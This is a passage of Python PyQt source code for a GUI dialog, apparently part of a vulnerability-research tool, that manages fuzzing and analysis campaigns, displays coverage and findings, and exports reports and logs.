            self.file_coverage_display.setText(f"Error displaying coverage: {e!s}")

    def _clear_coverage_display(self):
        """Clear all coverage display elements."""
        self.coverage_summary_text.clear()
        self.line_coverage_bar.setValue(0)
        self.function_coverage_bar.setValue(0)
        self.branch_coverage_bar.setValue(0)
        self.line_coverage_label.setText("0%")
        self.function_coverage_label.setText("0%")
        self.branch_coverage_label.setText("0%")
        self.hot_spots_table.setRowCount(0)
        self.cold_spots_table.setRowCount(0)
        self.function_coverage_table.setRowCount(0)
        self.file_coverage_combo.clear()
        self.file_coverage_display.clear()

    def _export_coverage_report(self):
        """Export detailed coverage report to file."""
        if not hasattr(self, "_current_coverage_data"):
            QMessageBox.warning(self, "Warning", "No coverage data available to export.")
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Coverage Report",
            "coverage_report.json",
            "JSON Files (*.json);;All Files (*)",
        )

        if file_path:
            try:
                # Create fuzzing engine to generate report
                fuzzing_engine = FuzzingEngine()
                report = fuzzing_engine._generate_coverage_report(
                    self._current_coverage_data, file_path
                )

                if report:
                    QMessageBox.information(
                        self, "Success", f"Coverage report exported to {file_path}"
                    )
                else:
                    QMessageBox.warning(self, "Warning", "Failed to generate coverage report.")

            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {e!s}")

    def _export_coverage_visualization(self):
        """Export coverage visualization data."""
        if not hasattr(self, "_current_coverage_data"):
            QMessageBox.warning(self, "Warning", "No coverage data available to export.")
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Coverage Visualization",
            "coverage_visualization.json",
            "JSON Files (*.json);;All Files (*)",
        )

        if file_path:
            try:
                import json

                # Create fuzzing engine to generate visualization data
                fuzzing_engine = FuzzingEngine()
                viz_data = fuzzing_engine._visualize_coverage_data(self._current_coverage_data)

                if viz_data:
                    with open(file_path, "w") as f:
                        json.dump(viz_data, f, indent=2)
                    QMessageBox.information(
                        self, "Success", f"Visualization data exported to {file_path}"
                    )
                else:
                    QMessageBox.warning(self, "Warning", "Failed to generate visualization data.")

            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {e!s}")

    def _create_configuration_tab(self) -> QWidget:
        """Create configuration tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Research configuration
        research_group = QGroupBox("Research Configuration")
        research_layout = QGridLayout(research_group)

        research_layout.addWidget(QLabel("Max Concurrent Campaigns:"), 0, 0)
        self.max_campaigns_spin = QSpinBox()
        self.max_campaigns_spin.setRange(1, 20)
        self.max_campaigns_spin.setValue(5)
        research_layout.addWidget(self.max_campaigns_spin, 0, 1)

        research_layout.addWidget(QLabel("Default Timeout (seconds):"), 1, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(300, 86400)
        self.timeout_spin.setValue(3600)
        research_layout.addWidget(self.timeout_spin, 1, 1)

        research_layout.addWidget(QLabel("Result Storage Directory:"), 2, 0)
        self.storage_dir_edit = QLineEdit()
        import tempfile
        self.storage_dir_edit.setText(os.path.join(tempfile.gettempdir(), "intellicrack_research"))
        research_layout.addWidget(self.storage_dir_edit, 2, 1)

        research_layout.addWidget(QLabel("Auto Correlation:"), 3, 0)
        self.auto_correlation_check = QCheckBox()
        self.auto_correlation_check.setChecked(True)
        research_layout.addWidget(self.auto_correlation_check, 3, 1)

        layout.addWidget(research_group)

        # ML configuration
        ml_group = QGroupBox("ML Configuration")
        ml_layout = QGridLayout(ml_group)

        ml_layout.addWidget(QLabel("Min Training Samples:"), 0, 0)
        self.min_samples_spin = QSpinBox()
        self.min_samples_spin.setRange(10, 1000)
        self.min_samples_spin.setValue(50)
        ml_layout.addWidget(self.min_samples_spin, 0, 1)

        ml_layout.addWidget(QLabel("Retrain Threshold:"), 1, 0)
        self.retrain_threshold_spin = QSpinBox()
        self.retrain_threshold_spin.setRange(50, 10000)
        self.retrain_threshold_spin.setValue(100)
        ml_layout.addWidget(self.retrain_threshold_spin, 1, 1)

        ml_layout.addWidget(QLabel("Confidence Threshold:"), 2, 0)
        self.confidence_spin = QSpinBox()
        self.confidence_spin.setRange(50, 99)
        self.confidence_spin.setValue(70)
        self.confidence_spin.setSuffix("%")
        ml_layout.addWidget(self.confidence_spin, 2, 1)

        layout.addWidget(ml_group)

        # Integration settings
        integration_group = QGroupBox("Integration Settings")
        integration_layout = QGridLayout(integration_group)

        integration_layout.addWidget(QLabel("AI Model Integration:"), 0, 0)
        self.ai_integration_check = QCheckBox()
        self.ai_integration_check.setChecked(True)
        integration_layout.addWidget(self.ai_integration_check, 0, 1)

        integration_layout.addWidget(QLabel("Automated Exploitation:"), 1, 0)
        self.auto_exploitation_check = QCheckBox()
        self.auto_exploitation_check.setChecked(False)
        integration_layout.addWidget(self.auto_exploitation_check, 1, 1)

        integration_layout.addWidget(QLabel("Real-time Adaptation:"), 2, 0)
        self.realtime_adaptation_check = QCheckBox()
        self.realtime_adaptation_check.setChecked(True)
        integration_layout.addWidget(self.realtime_adaptation_check, 2, 1)

        layout.addWidget(integration_group)

        # Configuration controls
        config_controls = QHBoxLayout()

        self.save_config_btn = QPushButton("Save Configuration")
        self.save_config_btn.clicked.connect(self._save_configuration)
        config_controls.addWidget(self.save_config_btn)

        self.load_config_btn = QPushButton("Load Configuration")
        self.load_config_btn.clicked.connect(self._load_configuration)
        config_controls.addWidget(self.load_config_btn)

        self.reset_config_btn = QPushButton("Reset to Defaults")
        self.reset_config_btn.clicked.connect(self._reset_configuration)
        config_controls.addWidget(self.reset_config_btn)

        config_controls.addStretch()

        layout.addLayout(config_controls)
        layout.addStretch()

        return widget

    # Event handlers and operations

    def _load_initial_data(self):
        """Load initial data and populate UI."""
        try:
            if not RESEARCH_AVAILABLE:
                QMessageBox.warning(
                    self,
                    "Warning",
                    "Research components not available. Some features may be limited.",
                )
                return

            # Load existing campaigns
            self._refresh_campaigns()

            # Load model status
            self._refresh_models()

            # Load results
            self._refresh_results()

        except Exception as e:
            logger.error(f"Failed to load initial data: {e}")

    def _browse_targets(self):
        """Browse for target files."""
        files, _ = QFileDialog.getOpenFileNames(self, "Select Target Files", "", "All Files (*)")

        if files:
            current_text = self.targets_edit.toPlainText()
            if current_text:
                current_text += "\n"
            current_text += "\n".join(files)
            self.targets_edit.setPlainText(current_text)

    def _create_campaign(self):
        """Create new research campaign."""
        try:
            name = self.campaign_name_edit.text().strip()
            if not name:
                QMessageBox.warning(self, "Warning", "Please enter a campaign name.")
                return

            campaign_type = self.campaign_type_combo.currentText()
            template = self.template_combo.currentText()

            targets_text = self.targets_edit.toPlainText().strip()
            if not targets_text:
                QMessageBox.warning(self, "Warning", "Please specify target files.")
                return

            targets = [t.strip() for t in targets_text.split("\n") if t.strip()]

            # Map UI values to internal values
            type_mapping = {
                "Binary Analysis": "binary_analysis",
                "Fuzzing": "fuzzing",
                "Vulnerability Assessment": "vulnerability_assessment",
                "Patch Analysis": "patch_analysis",
                "Hybrid Research": "hybrid_research",
            }

            template_mapping = {
                "None": None,
                "Basic Fuzzing": "basic_fuzzing",
                "Comprehensive Analysis": "comprehensive_analysis",
                "Patch Research": "patch_research",
            }

            campaign_type_val = type_mapping.get(campaign_type, "binary_analysis")
            template_val = template_mapping.get(template)

            # Add to worker queue
            self.worker.add_operation(
                "create_campaign",
                name=name,
                campaign_type=campaign_type_val,
                targets=targets,
                template=template_val,
            )

            # Clear form
            self.campaign_name_edit.clear()
            self.targets_edit.clear()

            QMessageBox.information(self, "Success", "Campaign creation initiated.")

        except Exception as e:
            logger.error(f"Campaign creation failed: {e}")
            QMessageBox.critical(self, "Error", f"Failed to create campaign: {e}")

    def _start_selected_campaign(self):
        """Start selected campaign."""
        selected_items = self.campaigns_tree.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a campaign to start.")
            return

        item = selected_items[0]
        campaign_id = item.data(0, Qt.UserRole)

        if campaign_id:
            self.worker.add_operation("start_campaign", campaign_id=campaign_id)
            QMessageBox.information(self, "Success", "Campaign start initiated.")

    # Signal handlers

    def _on_campaign_updated(self, campaign_id: str, data: dict):
        """Handle campaign update."""
        self.active_campaigns[campaign_id] = data
        self._refresh_campaigns()

    def _on_results_ready(self, campaign_id: str, results: dict):
        """Handle results ready."""
        self.campaign_results[campaign_id] = results
        self._refresh_results()

    def _on_error_occurred(self, operation: str, error: str):
        """Handle error."""
        QMessageBox.critical(self, "Error", f"Operation '{operation}' failed: {error}")

    def _refresh_campaigns(self):
        """Refresh campaigns display."""
        self.campaigns_tree.clear()

        if not self.research_manager:
            return

        try:
            campaigns_result = self.research_manager.list_campaigns()
            if campaigns_result["success"]:
                for campaign in campaigns_result["campaigns"]:
                    item = QTreeWidgetItem(
                        [
                            campaign["name"],
                            campaign["type"],
                            campaign["status"],
                            f"{campaign['progress']:.1%}",
                            str(campaign["targets_count"]),
                            datetime.fromtimestamp(campaign["created_at"]).strftime(
                                "%Y-%m-%d %H:%M"
                            ),
                        ],
                    )
                    item.setData(0, Qt.UserRole, campaign["id"])
                    self.campaigns_tree.addTopLevelItem(item)

        except Exception as e:
            logger.error(f"Failed to refresh campaigns: {e}")

    def _refresh_results(self):
        """Refresh results display."""
        self.results_tree.clear()

        for campaign_id, results in self.campaign_results.items():
            campaign_name = f"Campaign {campaign_id[:8]}"
            item = QTreeWidgetItem(
                [
                    campaign_name,
                    results.get("campaign_type", "Unknown"),
                    "Completed" if results.get("success") else "Failed",
                    f"{len(results.get('detailed_results', {}))} results",
                    datetime.now().strftime("%Y-%m-%d %H:%M"),
                ],
            )
            item.setData(0, Qt.UserRole, campaign_id)
            self.results_tree.addTopLevelItem(item)

    def _update_campaign_status(self):
        """Update campaign status periodically."""
        if self.research_manager:
            try:
                # Update active campaigns
                campaigns_result = self.research_manager.list_campaigns(status_filter="running")
                if campaigns_result["success"]:
                    for campaign in campaigns_result["campaigns"]:
                        if campaign["id"] in self.active_campaigns:
                            self.active_campaigns[campaign["id"]].update(campaign)

                self._refresh_campaigns()

            except Exception as e:
                logger.debug(f"Status update failed: {e}")

    def closeEvent(self, event):
        """Handle dialog close."""
        self.worker.stop()
        self.worker.wait()
        super().closeEvent(event)

    # Placeholder methods for remaining functionality

    def _pause_selected_campaign(self):
        """Pause selected campaign."""
        selected_items = self.campaigns_tree.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a campaign to pause.")
            return

        item = selected_items[0]
        campaign_id = item.data(0, Qt.UserRole)
        campaign_status = item.text(2)

        if campaign_status != "Running":
            QMessageBox.warning(self, "Warning", "Only running campaigns can be paused.")
            return

        if not campaign_id or not self.research_manager:
            QMessageBox.error(self, "Error", "Invalid campaign or research manager not available.")
            return

        try:
            # Update campaign status in research manager
            result = self.research_manager.pause_campaign(campaign_id)

            if result.get("success"):
                # Update UI immediately
                item.setText(2, "Paused")

                # Update internal state
                if campaign_id in self.active_campaigns:
                    self.active_campaigns[campaign_id]["status"] = "paused"

                # Add operation to worker queue for background processing
                self.worker.add_operation("pause_campaign", campaign_id=campaign_id)

                # Log the action
                logger.info(f"Campaign {campaign_id} paused successfully")

                QMessageBox.information(
                    self, "Success", f"Campaign '{item.text(0)}' has been paused."
                )
            else:
                error_msg = result.get("error", "Unknown error occurred")
                logger.error(f"Failed to pause campaign {campaign_id}: {error_msg}")
                QMessageBox.critical(self, "Error", f"Failed to pause campaign: {error_msg}")

        except Exception as e:
            logger.error(f"Exception while pausing campaign {campaign_id}: {e}")
            QMessageBox.critical(self, "Error", f"Failed to pause campaign: {e!s}")

    def _cancel_selected_campaign(self):
        """Cancel selected campaign."""
        selected_items = self.campaigns_tree.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a campaign to cancel.")
            return

        item = selected_items[0]
        campaign_id = item.data(0, Qt.UserRole)
        campaign_name = item.text(0)
        campaign_status = item.text(2)

        if campaign_status in ["Completed", "Failed", "Cancelled"]:
            QMessageBox.warning(self, "Warning", f"Campaign is already {campaign_status.lower()}.")
            return

        # Confirm cancellation
        reply = QMessageBox.question(
            self,
            "Confirm Cancellation",
            f"Are you sure you want to cancel campaign '{campaign_name}'?\n\n"
            "This will stop all running operations and cannot be undone.",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No,
        )

        if reply != QMessageBox.Yes:
            return

        if not campaign_id or not self.research_manager:
            QMessageBox.error(self, "Error", "Invalid campaign or research manager not available.")
            return

        try:
            # Cancel campaign in research manager
            result = self.research_manager.cancel_campaign(campaign_id)

            if result.get("success"):
                # Update UI
                item.setText(2, "Cancelled")
                item.setText(3, "0%")  # Reset progress

                # Clean up internal state
                if campaign_id in self.active_campaigns:
                    campaign_data = self.active_campaigns[campaign_id]
                    campaign_data["status"] = "cancelled"
                    campaign_data["progress"] = 0.0

                    # Archive partial results if any
                    if "partial_results" in campaign_data:
                        self.campaign_results[campaign_id] = {
                            "campaign_type": campaign_data.get("type", "Unknown"),
                            "status": "cancelled",
                            "partial": True,
                            "results": campaign_data["partial_results"],
                            "cancelled_at": time.time(),
                        }

                # Stop any running operations for this campaign
                self.worker.add_operation("cancel_campaign", campaign_id=campaign_id)

                # Clean up temporary files
                self._cleanup_campaign_files(campaign_id)

                logger.info(f"Campaign {campaign_id} cancelled successfully")
                QMessageBox.information(
                    self, "Success", f"Campaign '{campaign_name}' has been cancelled."
                )

                # Refresh results if partial results were saved
                if campaign_id in self.campaign_results:
                    self._refresh_results()

            else:
                error_msg = result.get("error", "Unknown error occurred")
                logger.error(f"Failed to cancel campaign {campaign_id}: {error_msg}")
                QMessageBox.critical(self, "Error", f"Failed to cancel campaign: {error_msg}")

        except Exception as e:
            logger.error(f"Exception while cancelling campaign {campaign_id}: {e}")
            QMessageBox.critical(self, "Error", f"Failed to cancel campaign: {e!s}")

    def _cleanup_campaign_files(self, campaign_id: str):
        """Clean up temporary files for cancelled campaign."""
        try:
            import os
            import shutil

            # Clean up output directory
            output_dir = os.path.join(self.storage_dir_edit.text(), campaign_id)
            if os.path.exists(output_dir):
                # Archive important files before deletion
                archive_dir = os.path.join(self.storage_dir_edit.text(), "cancelled", campaign_id)
                os.makedirs(archive_dir, exist_ok=True)

                # Save logs and partial results
                for filename in ["campaign.log", "partial_results.json", "crashes"]:
                    src = os.path.join(output_dir, filename)
                    if os.path.exists(src):
                        dst = os.path.join(archive_dir, filename)
                        if os.path.isdir(src):
                            shutil.copytree(src, dst, dirs_exist_ok=True)
                        else:
                            shutil.copy2(src, dst)

                # Remove original directory
                shutil.rmtree(output_dir)
                logger.info(f"Cleaned up files for campaign {campaign_id}")

        except Exception as e:
            logger.error(f"Failed to cleanup campaign files: {e}")

    def _show_campaign_details(self, item=None, column=None):
        """Show campaign details."""
        if item is None:
            selected_items = self.campaigns_tree.selectedItems()
            if not selected_items:
                QMessageBox.warning(self, "Warning", "Please select a campaign to view details.")
                return
            item = selected_items[0]

        campaign_id = item.data(0, Qt.UserRole)
        if not campaign_id:
            return

        # Get campaign data
        campaign_data = self.active_campaigns.get(campaign_id, {})
        if not campaign_data and self.research_manager:
            # Try to fetch from research manager
            result = self.research_manager.get_campaign_details(campaign_id)
            if result.get("success"):
                campaign_data = result.get("campaign", {})

        if not campaign_data:
            QMessageBox.warning(self, "Warning", "Campaign details not available.")
            return

        # Create details dialog
        details_dialog = QDialog(self)
        details_dialog.setWindowTitle(f"Campaign Details: {campaign_data.get('name', 'Unknown')}")
        details_dialog.setMinimumSize(800, 600)

        layout = QVBoxLayout(details_dialog)

        # Create tabs for different aspects
        tabs = QTabWidget()

        # Overview tab
        overview_widget = self._create_campaign_overview_widget(campaign_data)
        tabs.addTab(overview_widget, "Overview")

        # Configuration tab
        config_widget = self._create_campaign_config_widget(campaign_data)
        tabs.addTab(config_widget, "Configuration")

        # Progress tab
        progress_widget = self._create_campaign_progress_widget(campaign_data)
        tabs.addTab(progress_widget, "Progress")

        # Findings tab
        findings_widget = self._create_campaign_findings_widget(campaign_data)
        tabs.addTab(findings_widget, "Findings")

        # Logs tab
        logs_widget = self._create_campaign_logs_widget(campaign_id)
        tabs.addTab(logs_widget, "Logs")

        layout.addWidget(tabs)

        # Buttons
        button_layout = QHBoxLayout()

        refresh_btn = QPushButton("Refresh")
        refresh_btn.clicked.connect(lambda: self._refresh_campaign_details(campaign_id, tabs))
        button_layout.addWidget(refresh_btn)

        export_btn = QPushButton("Export Details")
        export_btn.clicked.connect(
            lambda: self._export_campaign_details(campaign_id, campaign_data)
        )
        button_layout.addWidget(export_btn)

        button_layout.addStretch()

        close_btn = QPushButton("Close")
        close_btn.clicked.connect(details_dialog.close)
        button_layout.addWidget(close_btn)

        layout.addLayout(button_layout)

        details_dialog.exec()

    def _create_campaign_overview_widget(self, campaign_data: dict) -> QWidget:
        """Create overview widget for campaign details."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Campaign info
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_text.setMaximumHeight(200)

        info_content = f"""
Campaign Name: {campaign_data.get('name', 'Unknown')}
Campaign ID: {campaign_data.get('id', 'Unknown')}
Type: {campaign_data.get('type', 'Unknown')}
Status: {campaign_data.get('status', 'Unknown')}
Progress: {campaign_data.get('progress', 0) * 100:.1f}%

Created: {datetime.fromtimestamp(campaign_data.get('created_at', 0)).strftime('%Y-%m-%d %H:%M:%S')}
Started: {datetime.fromtimestamp(campaign_data.get('started_at', 0)).strftime('%Y-%m-%d %H:%M:%S') if campaign_data.get('started_at') else 'Not started'}
Duration: {self._format_duration(campaign_data.get('duration', 0))}

Targets: {campaign_data.get('targets_count', len(campaign_data.get('targets', [])))}
"""
        info_text.setText(info_content.strip())
        layout.addWidget(info_text)

        # Statistics
        stats_group = QGroupBox("Statistics")
        stats_layout = QGridLayout(stats_group)

        stats = campaign_data.get("statistics", {})
        stats_layout.addWidget(QLabel("Test Cases Executed:"), 0, 0)
        stats_layout.addWidget(QLabel(str(stats.get("test_cases", 0))), 0, 1)

        stats_layout.addWidget(QLabel("Vulnerabilities Found:"), 1, 0)
        stats_layout.addWidget(QLabel(str(stats.get("vulnerabilities", 0))), 1, 1)

        stats_layout.addWidget(QLabel("Crashes Detected:"), 2, 0)
        stats_layout.addWidget(QLabel(str(stats.get("crashes", 0))), 2, 1)

        stats_layout.addWidget(QLabel("Coverage Achieved:"), 3, 0)
        stats_layout.addWidget(QLabel(f"{stats.get('coverage', 0):.1f}%"), 3, 1)

        layout.addWidget(stats_group)

        # Target list
        targets_group = QGroupBox("Targets")
        targets_layout = QVBoxLayout(targets_group)

        targets_list = QListWidget()
        for target in campaign_data.get("targets", []):
            targets_list.addItem(target)
        targets_layout.addWidget(targets_list)

        layout.addWidget(targets_group)

        return widget

    def _create_campaign_config_widget(self, campaign_data: dict) -> QWidget:
        """Create configuration widget for campaign details."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        config_text = QTextEdit()
        config_text.setReadOnly(True)
        config_text.setFont(self._get_monospace_font())

        # Format configuration as JSON
        config = campaign_data.get("configuration", {})
        import json

        config_json = json.dumps(config, indent=2, sort_keys=True)
        config_text.setText(config_json)

        layout.addWidget(QLabel("Campaign Configuration:"))
        layout.addWidget(config_text)

        return widget

    def _create_campaign_progress_widget(self, campaign_data: dict) -> QWidget:
        """Create progress widget for campaign details."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Overall progress
        progress_bar = QProgressBar()
        progress_bar.setRange(0, 100)
        progress_bar.setValue(int(campaign_data.get("progress", 0) * 100))
        layout.addWidget(QLabel("Overall Progress:"))
        layout.addWidget(progress_bar)

        # Phase progress
        phases_group = QGroupBox("Phase Progress")
        phases_layout = QVBoxLayout(phases_group)

        phases = campaign_data.get("phases", {})
        for phase_name, phase_data in phases.items():
            phase_layout = QHBoxLayout()
            phase_layout.addWidget(QLabel(f"{phase_name}:"))

            phase_bar = QProgressBar()
            phase_bar.setRange(0, 100)
            phase_bar.setValue(int(phase_data.get("progress", 0) * 100))
            phase_layout.addWidget(phase_bar)

            phase_layout.addWidget(QLabel(f"{phase_data.get('status', 'Pending')}"))
            phases_layout.addLayout(phase_layout)

        layout.addWidget(phases_group)

        # Timeline
        timeline_group = QGroupBox("Timeline")
        timeline_layout = QVBoxLayout(timeline_group)

        timeline_text = QTextEdit()
        timeline_text.setReadOnly(True)
        timeline_text.setMaximumHeight(200)

        events = campaign_data.get("timeline_events", [])
        timeline_content = ""
        for event in sorted(events, key=lambda x: x.get("timestamp", 0)):
            timestamp = datetime.fromtimestamp(event.get("timestamp", 0)).strftime("%H:%M:%S")
            timeline_content += f"{timestamp} - {event.get('event', 'Unknown event')}\n"

        timeline_text.setText(timeline_content)
        timeline_layout.addWidget(timeline_text)

        layout.addWidget(timeline_group)
        layout.addStretch()

        return widget

    def _create_campaign_findings_widget(self, campaign_data: dict) -> QWidget:
        """Create findings widget for campaign details."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Summary
        summary_group = QGroupBox("Findings Summary")
        summary_layout = QGridLayout(summary_group)

        findings = campaign_data.get("findings", {})

        summary_layout.addWidget(QLabel("Critical:"), 0, 0)
        summary_layout.addWidget(QLabel(str(findings.get("critical", 0))), 0, 1)

        summary_layout.addWidget(QLabel("High:"), 1, 0)
        summary_layout.addWidget(QLabel(str(findings.get("high", 0))), 1, 1)

        summary_layout.addWidget(QLabel("Medium:"), 2, 0)
        summary_layout.addWidget(QLabel(str(findings.get("medium", 0))), 2, 1)

        summary_layout.addWidget(QLabel("Low:"), 3, 0)
        summary_layout.addWidget(QLabel(str(findings.get("low", 0))), 3, 1)

        layout.addWidget(summary_group)

        # Detailed findings table
        findings_table = QTableWidget()
        findings_table.setColumnCount(5)
        findings_table.setHorizontalHeaderLabels(
            ["Type", "Severity", "Location", "Confidence", "Description"]
        )

        vulnerabilities = campaign_data.get("vulnerabilities", [])
        findings_table.setRowCount(len(vulnerabilities))

        for row, vuln in enumerate(vulnerabilities):
            findings_table.setItem(row, 0, QTableWidgetItem(vuln.get("type", "Unknown")))
            findings_table.setItem(row, 1, QTableWidgetItem(vuln.get("severity", "Unknown")))
            findings_table.setItem(row, 2, QTableWidgetItem(vuln.get("location", "Unknown")))
            findings_table.setItem(row, 3, QTableWidgetItem(f"{vuln.get('confidence', 0):.1f}%"))
            findings_table.setItem(row, 4, QTableWidgetItem(vuln.get("description", "")))

        findings_table.resizeColumnsToContents()
        layout.addWidget(findings_table)

        return widget

    def _create_campaign_logs_widget(self, campaign_id: str) -> QWidget:
        """Create logs widget for campaign details."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Log viewer
        log_text = QTextEdit()
        log_text.setReadOnly(True)
        log_text.setFont(self._get_monospace_font())

        # Load logs
        log_content = self._load_campaign_logs(campaign_id)
        log_text.setText(log_content)

        # Controls
        controls_layout = QHBoxLayout()

        refresh_btn = QPushButton("Refresh Logs")
        refresh_btn.clicked.connect(lambda: log_text.setText(self._load_campaign_logs(campaign_id)))
        controls_layout.addWidget(refresh_btn)

        clear_btn = QPushButton("Clear Display")
        clear_btn.clicked.connect(log_text.clear)
        controls_layout.addWidget(clear_btn)

        controls_layout.addStretch()

        # Log level filter
        controls_layout.addWidget(QLabel("Filter:"))
        level_combo = QComboBox()
        level_combo.addItems(["All", "ERROR", "WARNING", "INFO", "DEBUG"])
        level_combo.currentTextChanged.connect(
            lambda level: self._filter_campaign_logs(campaign_id, level, log_text),
        )
        controls_layout.addWidget(level_combo)

        layout.addLayout(controls_layout)
        layout.addWidget(log_text)

        return widget

    def _load_campaign_logs(self, campaign_id: str) -> str:
        """Load campaign logs from file."""
        try:
            import os

            log_file = os.path.join(self.storage_dir_edit.text(), campaign_id, "campaign.log")
            if os.path.exists(log_file):
                with open(log_file, encoding="utf-8") as f:
                    return f.read()
            else:
                return "No logs available for this campaign."
        except Exception as e:
            return f"Failed to load logs: {e!s}"

    def _filter_campaign_logs(self, campaign_id: str, level: str, log_widget: QTextEdit):
        """Filter campaign logs by level."""
        full_logs = self._load_campaign_logs(campaign_id)
        if level == "All":
            log_widget.setText(full_logs)
        else:
            filtered_lines = []
            for line in full_logs.split("\n"):
                if level in line:
                    filtered_lines.append(line)
            log_widget.setText("\n".join(filtered_lines))

    def _format_duration(self, seconds: float) -> str:
        """Format duration in human-readable format."""
        if seconds < 60:
            return f"{seconds:.0f} seconds"
        if seconds < 3600:
            return f"{seconds/60:.1f} minutes"
        return f"{seconds/3600:.1f} hours"

    def _refresh_campaign_details(self, campaign_id: str, tabs: QTabWidget):
        """Refresh campaign details in dialog."""
        if self.research_manager:
            result = self.research_manager.get_campaign_details(campaign_id)
            if result.get("success"):
                campaign_data = result.get("campaign", {})

                # Update Overview Tab (index 0)
                overview_widget = tabs.widget(0)
                if overview_widget:
                    # Find and update overview labels
                    for child in overview_widget.findChildren(QLabel):
                        object_name = child.objectName()
                        if object_name == "name_label":
                            child.setText(f"Name: {campaign_data.get('name', 'Unknown')}")
                        elif object_name == "type_label":
                            child.setText(f"Type: {campaign_data.get('type', 'Unknown')}")
                        elif object_name == "status_label":
                            child.setText(f"Status: {campaign_data.get('status', 'Unknown')}")
                        elif object_name == "progress_label":
                            child.setText(f"Progress: {campaign_data.get('progress', 0):.1%}")
                        elif object_name == "created_label":
                            created = campaign_data.get("created_at", 0)
                            child.setText(
                                f"Created: {datetime.fromtimestamp(created).strftime('%Y-%m-%d %H:%M:%S')}"
                            )
                        elif object_name == "duration_label":
                            duration = campaign_data.get("duration", 0)
                            child.setText(f"Duration: {self._format_duration(duration)}")

                # Update Targets Tab (index 1)
                targets_widget = tabs.widget(1)
                if targets_widget:
                    targets_list = targets_widget.findChild(QListWidget)
                    if targets_list:
                        targets_list.clear()
                        for target in campaign_data.get("targets", []):
                            targets_list.addItem(target)

                # Update Results Tab (index 2)
                results_widget = tabs.widget(2)
                if results_widget:
                    results_table = results_widget.findChild(QTableWidget)
                    if results_table:
                        results_table.setRowCount(0)
                        results = campaign_data.get("results", {})
                        vulns = results.get("vulnerabilities", [])

                        for vuln in vulns:
                            row = results_table.rowCount()
                            results_table.insertRow(row)
                            results_table.setItem(row, 0, QTableWidgetItem(vuln.get("type", "")))
                            results_table.setItem(
                                row, 1, QTableWidgetItem(vuln.get("severity", ""))
                            )
                            results_table.setItem(
                                row, 2, QTableWidgetItem(vuln.get("location", ""))
                            )
                            results_table.setItem(
                                row, 3, QTableWidgetItem(vuln.get("description", ""))
                            )

                # Update Configuration Tab (index 3)
                config_widget = tabs.widget(3)
                if config_widget:
                    config_text = config_widget.findChild(QTextEdit)
                    if config_text:
                        config = campaign_data.get("configuration", {})
                        config_text.setText(json.dumps(config, indent=2))

                QMessageBox.information(tabs.parent(), "Success", "Campaign details refreshed.")

    def _export_campaign_details(self, campaign_id: str, campaign_data: dict):
        """Export campaign details to file."""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Campaign Details",
            f"campaign_{campaign_id[:8]}_details.json",
            "JSON Files (*.json);;All Files (*)",
        )

        if file_path:
            try:
                import json

                with open(file_path, "w") as f:
                    json.dump(campaign_data, f, indent=2, default=str)
                QMessageBox.information(
                    self, "Success", f"Campaign details exported to {file_path}"
                )
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export details: {e!s}")

    def _show_result_details(self):
        """Show result details."""
        selected_items = self.results_tree.selectedItems()
        if not selected_items:
            # Check if summary or other tabs have data to show
            if hasattr(self, "_last_selected_result"):
                self._display_result_in_tabs(self._last_selected_result)
            return

        item = selected_items[0]
        campaign_id = item.data(0, Qt.UserRole)

        if not campaign_id or campaign_id not in self.campaign_results:
            QMessageBox.warning(self, "Warning", "Result details not available.")
            return

        result_data = self.campaign_results[campaign_id]
        self._last_selected_result = result_data

        # Display in tabs
        self._display_result_in_tabs(result_data)

    def _display_result_in_tabs(self, result_data: dict):
        """Display result data in the various tabs."""
        # Update summary tab
        self._update_summary_tab(result_data)

        # Update vulnerabilities tab
        self._update_vulnerabilities_tab(result_data)

        # Update correlation tab
        self._update_correlation_tab(result_data)

        # Update raw data tab
        self._update_raw_data_tab(result_data)

    def _update_summary_tab(self, result_data: dict):
        """Update summary tab with result overview."""
        summary_text = f"""
Campaign Type: {result_data.get('campaign_type', 'Unknown')}
Status: {result_data.get('status', 'Unknown')}
Completed: {datetime.fromtimestamp(result_data.get('completed_at', time.time())).strftime('%Y-%m-%d %H:%M:%S')}

=== Summary ===
Total Vulnerabilities: {len(result_data.get('vulnerabilities', []))}
Total Crashes: {result_data.get('crash_count', 0)}
Unique Crashes: {len(result_data.get('unique_crashes', []))}
Coverage Achieved: {result_data.get('coverage', {}).get('percentage', 0):.1f}%

=== Severity Breakdown ===
Critical: {self._count_by_severity(result_data.get('vulnerabilities', []), 'critical')}
High: {self._count_by_severity(result_data.get('vulnerabilities', []), 'high')}
Medium: {self._count_by_severity(result_data.get('vulnerabilities', []), 'medium')}
Low: {self._count_by_severity(result_data.get('vulnerabilities', []), 'low')}

=== Exploit Potential ===
Exploitable Crashes: {result_data.get('exploitable_crashes', 0)}
Remote Code Execution: {self._count_by_type(result_data.get('vulnerabilities', []), 'RCE')}
Memory Corruption: {self._count_by_type(result_data.get('vulnerabilities', []), 'memory_corruption')}
Information Disclosure: {self._count_by_type(result_data.get('vulnerabilities', []), 'info_disclosure')}

=== Performance Metrics ===
Test Cases Executed: {result_data.get('test_cases', 0)}
Execution Time: {self._format_duration(result_data.get('duration', 0))}
Executions/Second: {result_data.get('exec_per_sec', 0):.1f}
        """

        self.summary_edit.setText(summary_text.strip())

    def _update_vulnerabilities_tab(self, result_data: dict):
        """Update vulnerabilities table with detailed findings."""
        vulnerabilities = result_data.get("vulnerabilities", [])
        self.vulnerabilities_table.setRowCount(len(vulnerabilities))

        for row, vuln in enumerate(vulnerabilities):
            # Type
